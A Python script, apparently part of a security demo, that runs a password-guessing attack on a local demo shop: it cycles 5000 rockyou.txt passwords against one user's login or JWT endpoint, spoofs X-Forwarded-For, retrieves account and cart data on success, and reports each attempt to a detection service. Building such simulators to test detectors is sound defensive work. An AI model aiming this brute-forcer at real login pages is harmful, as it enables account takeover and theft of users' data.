import requests
import itertools
import time
import argparse
from pathlib import Path
from typing import Optional, Union


# This line sets up the location of the rockyou.txt password list. 
# I’m keeping it inside a “data” folder that sits right next to this file, so no matter 
# where I run the script from it will always know where to look. This avoids issues where 
# the working directory might change, making the code more reliable when shared or deployed.  
ROCKYOU_PATH = Path(__file__).with_name("data").joinpath("rockyou.txt")

# This is just a simple timeout setting for my HTTP requests. 
# I don’t want my script to hang forever waiting for a response from the server if something goes wrong. 
# By setting it to 3 seconds, I make sure the attack simulation feels quick and responsive, 
# and it also helps me avoid wasting time on dead connections.  
REQUEST_TIMEOUT = 3


# This function is responsible for loading credentials from a file. 
# I can pass in any path I want, but by default it will grab rockyou.txt in the data folder. 
# There’s also a “limit” option so that I don’t have to load the entire list every time, 
# which is useful when testing since rockyou.txt is huge.  
def load_creds(
    path: Union[Path, str] = ROCKYOU_PATH, limit: Optional[int] = None
):
    """Load credentials from a file with an optional limit."""

    path = Path(path)  # make sure the file path is in the right format

    passwords = []
    # I use latin-1 encoding because rockyou.txt contains all sorts of special characters.
    # Without this encoding, the file might break or throw errors when I try to read it. 
    # The loop goes line by line, strips newlines, and stops if I hit the optional limit.  
    with path.open(newline="", encoding="latin-1") as f:
        for i, line in enumerate(f):
            passwords.append(line.strip())
            if limit and i + 1 >= limit:
                break
    return passwords


# Here I’m preloading 5000 passwords from the rockyou list to use for my attack. 
# This keeps the demo manageable but still realistic because I’m not using just a couple of passwords. 
# If I want, I could remove the limit and go all in, but 5000 attempts is enough to 
# simulate credential stuffing without crashing my system.  
passwords = load_creds(limit=5000)

# I then put the password list into an itertools.cycle, which means once the list ends it loops back around. 
# That way I can run as many attempts as I want, and I never run out of passwords to test. 
# It basically makes the list endless, which is a neat trick for brute-force style scripts.  
pool = itertools.cycle(passwords)


# This is the main attack function and the core of the whole script. 
# Its job is to fire login attempts at the shop system, record how many succeed, how many are blocked, 
# and how long it took to break in. I can configure things like how fast it runs, how many attempts to make, 
# whether to use the JWT endpoint, and which user I’m targeting.  
def attack(
    rate_per_sec=10,
    attempts=50,
    use_jwt=False,
    score_base="http://localhost:8001",
    shop_url="http://localhost:3005",
    api_key=None,
    chain_url="/api/security/chain",
    user="alice",
):
    """Send repeated login attempts and report detection results."""

    # These variables are just counters and trackers for stats. 
    # I track successes, blocks, and when the very first success happens. 
    # I also log user info and cart data if I manage to retrieve it, because that shows 
    # how deep into the system I can get once I have valid creds.  
    success = 0
    blocked = 0
    first_success_attempt = None
    first_success_time = None
    first_user_info = None
    first_cart = None
    start = time.time()

    # I’m using a session object so that cookies and headers persist between requests. 
    # This makes the attack feel more “realistic” because in actual brute force scenarios 
    # the client would usually keep an open connection instead of creating a brand new one each time.  
    session = requests.Session()
    attempted = 0

    # These are my base headers that I might send with each request. 
    # They start empty, but I can add an API key or a chain password if needed. 
    # The chain endpoint is an optional rotating value that the system uses, so I fetch it here if it’s available.  
    base_headers = {}
    chain = None
    chain_endpoint = None
    if api_key:
        base_headers["X-API-Key"] = api_key
        if chain_url:
            chain_endpoint = (
                chain_url if chain_url.startswith("http") else f"{score_base}{chain_url}"
            )
            try:
                responseData = session.get(chain_endpoint, headers=base_headers, timeout=3)
                if responseData.ok:
                    chain = responseData.json().get("chain")
            except Exception as exc:
                print("CHAIN ERROR:", exc)

    # This is just a helper function to print out a summary once the attack is done. 
    # It tells me how many attempts were made, how many succeeded, how many got blocked, 
    # and if I managed to pull out any user info or cart data. This is the nice “final report” at the end.  
    def print_summary():
        total_time = time.time() - start
        print(f"Attempts: {attempted}, successes: {success}, blocked: {blocked}")
        if first_success_attempt:
            print(
                f"First success after {first_success_attempt} attempts ({first_success_time:.2f}s)"
            )
        print(f"Total elapsed time: {total_time:.2f}s")
        if first_user_info:
            print(f"First user data: {first_user_info}")
        if first_cart:
            print(f"First cart: {first_cart}")

    try:
        # This loop runs the actual stuffing attack. 
        # It goes through each attempt, grabs the next password, tries to log in, 
        # reports the result to the detection system, and then moves to the next attempt. 
        # I also sleep between attempts so I can simulate realistic rates instead of hammering too fast.  
        for i in range(1, attempts + 1):
            attempted = i
            pwd = next(pool)
            ip = "10.0.0.1"  # I fake the client IP, but in real life this would change or rotate

            token = None
            if use_jwt:
                # If I’m running in JWT mode, I try logging in via the JWT token endpoint. 
                # If successful, I get an access token that I can then use to hit other API endpoints 
                # like /alerts or /me, which simulates taking full control of the user’s account.  
                login_resp = session.post(
                    f"{score_base}/api/token",
                    data={"username": user, "password": pwd},
                    timeout=3,
                )
                login_ok = login_resp.status_code == 200
                token = login_resp.json().get("access_token") if login_ok else None
                if token:
                    session.get(
                        f"{score_base}/api/alerts",
                        headers={"Authorization": f"Bearer {token}"},
                        timeout=3,
                    )
            else:
                # If I’m not using JWT mode, I just hit the normal login endpoint of the shop. 
                # This still simulates a real brute force attempt, but without token handling. 
                # I include the fake IP header to make it look like requests are coming from a client machine.  
                login_resp = session.post(
                    f"{shop_url}/login",
                    json={"username": user, "password": pwd},
                    headers={"X-Forwarded-For": ip},
                    timeout=3,
                )
                login_ok = login_resp.status_code == 200

            # After every login attempt, I build a payload to send to the detector (/score). 
            # This payload tells the system whether the attempt was a success or failure, 
            # whether it used JWT, which username it targeted, and from which client IP.  
            score_payload = {
                "client_ip": ip,
                "auth_result": "success" if login_ok else "failure",
                "with_jwt": use_jwt,
                "username": user,
            }

            try:
                headers = dict(base_headers)
                if chain:
                    headers["X-Chain-Password"] = chain
                score_resp = requests.post(
                    f"{score_base}/score",
                    json=score_payload,
                    headers=headers,
                    timeout=REQUEST_TIMEOUT,
                )
                if score_resp.json().get("status") == "blocked":
                    blocked += 1
                
                # I also log the attempt as an “event” so it can be tracked in dashboards. 
                # This helps me later see metrics like how many stuffing attempts were made, 
                # how many were blocked, which rules fired, and so on.  
                event_payload = {
                    "username": user,
                    "action": "login",
                    "success": login_ok,
                    "source": "stuffing_script",
                    "is_credential_stuffing": True,
                    "blocked": score_resp.json().get("status") == "blocked",
                    "block_rule": "ip_rate_limit" if score_resp.json().get("status") == "blocked" else ""
                }
                try:
                    session.post(
                        f"{score_base}/events/auth",
                        json=event_payload,
                        headers=base_headers,
                        timeout=REQUEST_TIMEOUT,
                    )
                except requests.exceptions.RequestException as exc:
                    print(f"EVENT LOG ERROR contacting {score_base}/events/auth: {exc}")

                # If there’s a chain endpoint, I refresh it here in case it rotates. 
                # That way I always have the latest chain value for the next request.  
                if chain_endpoint:
                    try:
                        resp = session.get(
                            chain_endpoint, headers=base_headers, timeout=3
                        )
                        if resp.ok:
                            chain = resp.json().get("chain")
                    except Exception as exc:
                        print("CHAIN ERROR:", exc)
            except requests.exceptions.RequestException as exc:
                print(f"SCORE ERROR contacting {score_base}/score: {exc}")

            # If I actually manage to log in successfully, I record all the details. 
            # This includes increasing the success counter, retrieving user info with the token, 
            # and even pulling the user’s cart if it’s available. I also save the attempt number 
            # and time for the very first successful login.  
            if login_ok:
                success += 1
                if token:
                    try:
                        info_resp = requests.get(
                            f"{score_base}/api/me",
                            headers={"Authorization": f"Bearer {token}"},
                            timeout=3,
                        )
                        if info_resp.status_code == 200:
                            data = info_resp.json()
                            if first_user_info is None:
                                first_user_info = data
                            print(f"Retrieved user data: {data}")
                    except Exception as exc:
                        print("INFO ERROR:", exc)
                if first_cart is None:
                    try:
                        cart_resp = session.get(
                            f"{shop_url}/cart",
                            headers={"X-Reauth-Password": pwd},
                            timeout=3,
                        )
                        if cart_resp.status_code == 200:
                            first_cart = cart_resp.json()
                            print(f"Retrieved cart: {first_cart}")
                    except Exception as exc:
                        print("CART ERROR:", exc)
                if first_success_attempt is None:
                    first_success_attempt = i
                    first_success_time = time.time() - start

                time.sleep(1 / rate_per_sec)

            time.sleep(1 / rate_per_sec)
    except KeyboardInterrupt:
        # If I hit Ctrl+C to stop the script, I don’t just want it to die instantly. 
        # Instead, I catch the interrupt and still print the summary, so I get a nice 
        # clean report of how far the attack got before I killed it.  
        print("Interrupted by user, printing summary...")
        print_summary()
        return

    # At the very end, I print the summary again so I know the final stats. 
    # This lets me see the full story of the attack: how many times I tried, 
    # how many were blocked, and how quickly I got in.  
    print_summary()


# This final block is the script entry point. 
# It means that if I run “python stuffing.py” directly from the terminal, it will execute this code. 
# I use argparse here to make the script configurable, so I can pass in things like rate, attempts, 
# or whether I want to test JWT mode without having to edit the file itself.  
if __name__ == "__main__":
    credStuffingAttackData = argparse.ArgumentParser()
    credStuffingAttackData.add_argument("--jwt", action="store_true", help="Use JWT login endpoint")
    credStuffingAttackData.add_argument("--rate", type=float, default=5, help="Attempts per second")
    credStuffingAttackData.add_argument("--attempts", type=int, default=50, help="Number of attempts to send")
    credStuffingAttackData.add_argument("--user", default="alice", help="User to target")
    credStuffingAttackData.add_argument(
        "--score-base",
        default="http://localhost:8001",
        help="Detector API base URL",
    )
    credStuffingAttackData.add_argument("--shop-url", default="http://localhost:3005", help="Demo shop base URL")
    credStuffingAttackData.add_argument("--api-key", help="API key for protected endpoints")
    credStuffingAttackData.add_argument(
        "--chain-url",
        default="/api/security/chain",
        help="Endpoint to fetch rotating chain value",
    )
    args = credStuffingAttackData.parse_args()

    # Once the arguments are parsed, I just hand them straight to the attack() function. 
    # This keeps the script super flexible: I don’t need to change the code when I want 
    # to test different users, rates, or even switch between JWT and normal login.  
    attack(
        rate_per_sec=args.rate,
        attempts=args.attempts,
        use_jwt=args.jwt,
        score_base=args.score_base,
        shop_url=args.shop_url,
        api_key=args.api_key,
        chain_url=args.chain_url,
        user=args.user,
    )
